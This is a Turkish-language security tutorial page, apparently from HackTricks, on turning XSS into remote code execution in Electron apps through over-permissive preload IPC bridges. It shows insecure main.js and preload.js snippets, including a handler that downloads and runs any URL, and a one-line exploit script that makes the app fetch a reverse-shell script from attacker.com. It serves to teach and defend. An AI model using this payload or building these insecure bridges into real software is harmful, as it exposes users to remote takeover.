# Electron contextIsolation üzerinden RCE via IPC

{{#include ../../banners/hacktricks-training.md}}

Context isolation, güvenli olmayan bir preload bridge'ini güvenli hâle getirmez. Bir preload, renderer içeriğine ayrıcalıklı IPC erişimi sunuyorsa XSS veya ele geçirilmiş bir renderer bu bridge'i çağırabilir; RCE, ilgili main-process handler'ının doğrulamasına ve sunduğu yeteneklere bağlıdır. Electron, her işlem için tek ve dar kapsamlı bir method sunulmasını, IPC sender'larının doğrulanmasını ve ham IPC primitive'lerinin asla sunulmamasını önerir.<sup>[[3]](#references)[[4]](#references)</sup>

**Bu örneklerin çoğu buradan alınmıştır:** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Daha fazla bilgi için videoyu izleyin.<sup>[[1]](#references)</sup>

## Example 0

[https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own) adresindeki örnek (slaytlarda MS Teams'in XSS'ten RCE'ye nasıl kötüye kullanıldığının tam örneği var; bu yalnızca çok temel bir örnek):<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Example 1

`main.js` dosyasının `getUpdate` olayını nasıl dinlediğini ve iletilen **herhangi bir URL'yi indirip çalıştırdığını** inceleyin.\
`preload.js` dosyasının main'den gelen **herhangi bir IPC** olayını nasıl sunduğuna da bakın.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Örnek 2

Preload, scheme ve hedef doğrulaması olmadan `shell.openExternal` işlevini dışarı açarsa, renderer tarafından kontrol edilen girdi kayıtlı harici işleyicileri başlatabilir. Bunun kod yürütmeye dönüşüp dönüşmeyeceği platforma, yüklü işleyicilere, scheme'e ve Electron sürümüne bağlıdır; bunu beklenen `https:` hedeflerinin açık bir allowlist'iyle sınırlandırın.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## Örnek 3

Preload, ana süreçle kısıtlamasız iletişime izin veriyorsa bir XSS, rastgele kanal adları ve veriler gönderebilir. Etki, kayıtlı IPC işleyicilerine ve yetkilendirme kontrollerine bağlıdır.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [XSS ve RCE ile Modern Masaüstü Uygulamalarını Hackleme Atölyesi](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Microsoft Teams'i Nasıl Hackledim ve Pwn2Own'da 150.000 Dolar Kazandım](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — Güvenlik kontrol listesi](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — Bağlam yalıtımı ve güvenli API sunumu](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
